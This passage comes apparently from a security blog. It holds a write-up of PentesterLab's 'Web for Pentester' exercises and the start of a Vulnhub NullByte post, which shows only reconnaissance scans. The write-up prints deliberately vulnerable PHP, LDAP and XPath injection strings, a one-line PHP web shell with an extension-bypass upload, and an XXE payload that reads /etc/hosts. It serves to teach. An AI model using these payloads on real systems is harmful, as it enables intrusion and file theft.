<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="k">require</span> <span class="s2">&quot;../header.php&quot;</span> <span class="p">;</span>
</span><span class='line'>  <span class="nv">$ld</span> <span class="o">=</span> <span class="nb">ldap_connect</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Could not connect to LDAP server&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">ldap_set_option</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="nx">LDAP_OPT_PROTOCOL_VERSION</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">ldap_set_option</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="nx">LDAP_OPT_REFERRALS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$ld</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>     <span class="nv">$user</span> <span class="o">=</span> <span class="s2">&quot;uid=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;ou=people,dc=pentesterlab,dc=com&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="p">}</span>
</span><span class='line'>   <span class="nv">$lb</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ldap_bind</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$lb</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>       <span class="k">echo</span> <span class="s2">&quot;AUTHENTICATED&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>       <span class="k">echo</span> <span class="s2">&quot;NOT AUTHENTICATED&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">require</span> <span class="s2">&quot;../footer.php&quot;</span> <span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>First, let&rsquo;s learn more about <a href="http://projects.webappsec.org/w/page/13246947/LDAP%20Injection">LDAP</a>:</p>

<blockquote><p>LDAP Injection is an attack technique used to exploit web sites that construct LDAP statements from user-
supplied input.</p>

<p>Lightweight Directory Access Protocol (LDAP) is an open-standard protocol for both querying and
manipulating X.500 directory services. The LDAP protocol runs over Internet transport protocols, such as
TCP. Web applications may use user-supplied input to create custom LDAP statements for dynamic web page
requests.</p>

<p>When a web application fails to properly sanitize user-supplied input, it is possible for an attacker to
alter the construction of an LDAP statement. When an attacker is able to modify an LDAP statement, the
process will run with the same permissions as the component that executed the command. (e.g. Database
server, Web application server, Web server, etc.). This can cause serious security problems where the
permissions grant the rights to query, modify or remove anything inside the LDAP tree. The same advanced
exploitation techniques available in SQL Injection can also be similarly applied in LDAP Injection.</p></blockquote>

<p>This particular example is vulnerable to <a href="https://securitysynapse.blogspot.com/2013/09/dangers-of-ldap-null-base-and-bind.html">NULL bind</a>, where an anonymous user can access information from the LDAP directory without authentication. For this, the values sent to the server have to be null, so instead of just sending empty values, we have to completely remove them:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/ldap1_sol.png" title="ldap 1" alt="ldap null"></p>

<p><strong>Example 2</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/ldap2.png" title="ldap" alt="ldap 2"></p>

<p>Let&rsquo;s see the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="k">require</span> <span class="s2">&quot;../header.php&quot;</span> <span class="p">;</span>
</span><span class='line'>  <span class="nv">$ld</span> <span class="o">=</span> <span class="nb">ldap_connect</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Could not connect to LDAP server&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">ldap_set_option</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="nx">LDAP_OPT_PROTOCOL_VERSION</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">ldap_set_option</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="nx">LDAP_OPT_REFERRALS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$ld</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="nv">$lb</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ldap_bind</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="s2">&quot;cn=admin,dc=pentesterlab,dc=com&quot;</span><span class="p">,</span> <span class="s2">&quot;pentesterlab&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$lb</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nv">$pass</span> <span class="o">=</span> <span class="s2">&quot;{MD5}&quot;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">pack</span><span class="p">(</span><span class="s2">&quot;H*&quot;</span><span class="p">,</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])));</span>
</span><span class='line'>      <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&quot;(&amp;(cn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)(userPassword=&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;))&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$search</span><span class="o">=@</span><span class="nb">ldap_search</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="s2">&quot;ou=people,dc=pentesterlab,dc=com&quot;</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">)))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Unable to search ldap server&lt;br&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;msg:&#39;&quot;</span><span class="o">.</span><span class="nb">ldap_error</span><span class="p">(</span><span class="nv">$ld</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&lt;/br&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="nv">$number_returned</span> <span class="o">=</span> <span class="nb">ldap_count_entries</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span><span class="nv">$search</span><span class="p">);</span>
</span><span class='line'>      <span class="nv">$info</span> <span class="o">=</span> <span class="nb">ldap_get_entries</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">&quot;count&quot;</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>         <span class="c1">//NOK </span>
</span><span class='line'>         <span class="k">echo</span> <span class="s2">&quot;UNAUTHENTICATED&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;AUTHENTICATED as&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;uid&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]));</span>
</span><span class='line'>      <span class="p">}</span>    
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>   <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">require</span> <span class="s2">&quot;../footer.php&quot;</span> <span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>The goal here is to be able to authenticate with any password, and get information from the directory. Now, since the password is being hashed, the only likely place to inject into is the username. To learn more about LDAP, its rules and types of injection, I found a nice <a href="https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf">BlackHat whitepaper</a>. The key takeaway is that the injection will happen in the filter. In our case, the filter is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(&(cn=name)(userPassword=password))</span></code></pre></td></tr></table></div></figure>


<p>We see here that filter uses <strong>&amp;</strong>, which specifies an AND condition, where both username and password have to be true. Remembering that we can only inject inside the username parameter, here&rsquo;s what we can do:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(&(cn=name)(cn=*))%00(userPassword=password))</span></code></pre></td></tr></table></div></figure>


<p>The ) closes the name filter, then we introduce an always true condition with the * wildcard, the closing ) matches the  one at the beginning of the filter, and the null byte..well, nullifies the rest of the filter.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/ldap2_sol.png" title="ldap 2" alt="ldap filter injection"></p>

<h3>File Upload</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/upload1.png" title="upload1" alt="file upload"></p>

<p>It looks like we can upload an image and find it in the <code>/upload/images/</code> directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">]))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;/var/www/upload/images/&#39;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$file</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$dir</span><span class="o">.</span> <span class="nv">$file</span><span class="p">))</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>  <span class="k">echo</span> <span class="s2">&quot;Upload done&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">echo</span> <span class="s2">&quot;Your file can be found &lt;a href=</span><span class="se">\&quot;</span><span class="s2">/upload/images/&quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;here&lt;/a&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>      <span class="k">echo</span> <span class="s1">&#39;Upload failed&#39;</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Obviously, I am thinking about uploading a PHP shell instead. But first, I wanted to see if there is anything already in the images folder, and I wasn&rsquo;t disappointed:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/hacker.png" title="lol" alt="haxxor chat"></p>

<p>Ok, now it&rsquo;s time for the shell. I created a basic PHP shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Uploaded it, navigated to it and passed a command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.217.138/upload/images/ashell.php?cmd=pwd
</span><span class='line'>/var/www/upload/images </span></code></pre></td></tr></table></div></figure>


<p><strong>Example 2</strong></p>

<p>Same functionality, but this time the script doesn&rsquo;t allow PHP extensions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">]))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;/var/www/upload/images/&#39;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$file</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/\.php$/&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">DIE</span><span class="p">(</span><span class="s2">&quot;NO PHP&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">))</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>  <span class="k">echo</span> <span class="s1">&#39;Upload done !&#39;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">echo</span> <span class="s1">&#39;Your file can be found &lt;a href=&quot;/upload/images/&#39;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;here&lt;/a&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>      <span class="k">echo</span> <span class="s1">&#39;Upload failed&#39;</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>The code checks that an extension may not end in php. Uploading a .php file followed by a non-existent extension will cause the server to ignore the unknown extension and switch to the next one it knows. I uploaded the same shell as <code>ashell.php.fail</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.217.138/upload/images/ashell.php.fail?cmd=ls%20/home
</span><span class='line'>user</span></code></pre></td></tr></table></div></figure>


<h3>XML attacks</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/xml1.png" title="xml1" alt="xml 1"></p>

<p>A twist on the previous challenges, this time with the use of XML:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">Hello</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="nv">$xml</span><span class="o">=</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;xml&#39;</span><span class="p">]);</span>
</span><span class='line'>  <span class="nb">print_r</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$xml</span><span class="p">);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This particular vulnerability revolves around <a href="https://phpsecurity.readthedocs.io/en/latest/Injection-Attacks.html#xml-injection">XML injection</a>:</p>

<blockquote><p>Custom entities can be defined by including them directly in an optional DOCTYPE and the expanded
value they represent may reference an external resource to be included. It is this capacity of
ordinary XML to carry custom references which can be expanded with the contents of an external
resources that gives rise to an XXE vulnerability.</p></blockquote>

<p>So, I defined the following entity:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;</span></code></pre></td></tr></table></div></figure>


<p>This entity can be referenced with <code>&hacker;</code>. Of course, we will need to URL encode it. Here&rsquo;s the URL with the XML injection:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.217.138/xml/example1.php?xml=&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;&lt;test&gt;%26hacker%3B&lt;/test&gt;</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/xml1_inj.png" title="xml1" alt="xml injection"></p>

<p><strong>Example 2</strong></p>

<p>Another hello page, but the URL is a bit different: <a href="http://192.168.217.138/xml/example2.php?name=hacker">http://192.168.217.138/xml/example2.php?name=hacker</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'>  <span class="nv">$x</span> <span class="o">=</span> <span class="s2">&quot;&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$xml</span><span class="o">=</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$x</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$xpath</span> <span class="o">=</span> <span class="s2">&quot;users/user/name[.=&#39;&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;]/parent::*/message&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$res</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$xml</span><span class="o">-&gt;</span><span class="na">xpath</span><span class="p">(</span><span class="nv">$xpath</span><span class="p">));</span>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="k">list</span><span class="p">(</span> <span class="p">,</span><span class="nv">$node</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">echo</span> <span class="nv">$node</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We see here some XML data containing users and passwords, and user input being used to construct an <a href="https://www.w3schools.com/xml/xml_xpath.asp">XPATH</a> query. XPATH is used to navigate through elements and attributes in an XML document.</p>

<p>With a name of hacker, the XPATH would look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>users/user/name[.='hacker']/parent::*/message</span></code></pre></td></tr></table></div></figure>


<p><a href="https://www.owasp.org/index.php/XPATH_Injection">XPATH injection</a> is similar to SQL injection. Here we can inject inside the name input to create an always true condition and get rid of the remaining query as follows: <code>hacker' or 1=1]%00</code>. Now the query looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>users/user/name[.='hacker' or 1=1]%00']/parent::*/message</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/xml2.png" title="xml2" alt="xpath injection"></p>

<p>Wow, this was a really fun challenge, and I hadn&rsquo;t done a web app challenge in a while! Many thanks to PentesterLab for this challenge and their help when I had questions! They also have their own course for the challenge <a href="https://pentesterlab.com/exercises/web_for_pentester/course">here</a></p>

<p>Until next time, straight from the cow&rsquo;s mouth:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ You are fighting for survival in your \
</span><span class='line'>\ own sweet and gentle way.             /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - NullByte]]></title>
    <link href="http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte/"/>
    <updated>2017-04-18T11:00:06-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte</id>
    <content type="html"><![CDATA[<p>Today I&rsquo;m back with another vulnerable machine from Vulnhub! It&rsquo;s&#8217; been a while since I&rsquo;ve done one, and I was getting restless :D The target for today is called NullByte, and the goal is to read /root/proof.txt</p>

<!-- more -->


<p>I am going to use alternate tools to accomplish the enumeration tasks, instead of the usual Nmap ping scan. To identify the machine on the network, I&rsquo;ll go with <strong>netdiscover</strong> this time:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netdiscover -r 192.168.217.0/24
</span><span class='line'>
</span><span class='line'> Currently scanning: Finished!   |   Screen View: Unique Hosts                 
</span><span class='line'>
</span><span class='line'> 29 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1740             
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
</span><span class='line'> -----------------------------------------------------------------------------
</span><span class='line'> ...            
</span><span class='line'> 192.168.217.135 00:0c:29:57:bc:ff      4     240  Unknown vendor              
</span><span class='line'> ...  </span></code></pre></td></tr></table></div></figure>


<p>By correlating the VMware MAC address with the one in the scan, I know the IP of the target is 192.168.217.135. Next, I port scanned the target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -p- -sV 192.168.217.135
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-04-18 11:51 EDT
</span><span class='line'>Nmap scan report for 192.168.217.135
</span><span class='line'>Host is up, received arp-response (0.00016s latency).
</span><span class='line'>Not shown: 65531 closed ports
</span><span class='line'>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span><span class='line'>Reason: 65531 resets
</span><span class='line'>PORT      STATE SERVICE REASON         VERSION
</span><span class='line'>80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
</span><span class='line'>111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
